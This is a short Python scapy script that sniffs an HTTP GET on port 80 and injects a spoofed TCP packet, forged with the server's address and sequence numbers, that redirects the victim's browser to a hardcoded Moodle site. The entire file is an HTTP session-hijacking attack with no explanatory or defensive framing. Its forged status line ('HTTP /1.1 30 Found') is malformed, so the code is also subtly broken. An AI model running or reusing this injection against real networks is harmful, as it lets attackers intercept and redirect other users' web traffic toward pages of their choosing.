from threading import Thread
from scapy.all import *

class Redirect(Thread):
    def __init__(self,to = "www.moodle.jct.uc.il"):
        Thread.__init__(self)
        self.__redirectTO = to

    def run(self):
        sniff(count=1,
             filter="tcp port 80",
             lfilter=lambda p: 'GET' in str(p),
             prn=self.redirect)

    def redirect(self,packet):
        send(self.response(packet))

    def response(self,packet):
        ip = packet[IP]
        tcp = packet[TCP]
        html = "HTTP /1.1 30 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" %self.__redirectTO

        return IP(src=ip.dst, dst=ip.src) / TCP(dport = ip.sport,sport = ip.dport,flags = "PA",seq = tcp.ack,ack = tcp.seq + len(tcp.payload)) / Raw(load = html)

a = Redirect()
a.start()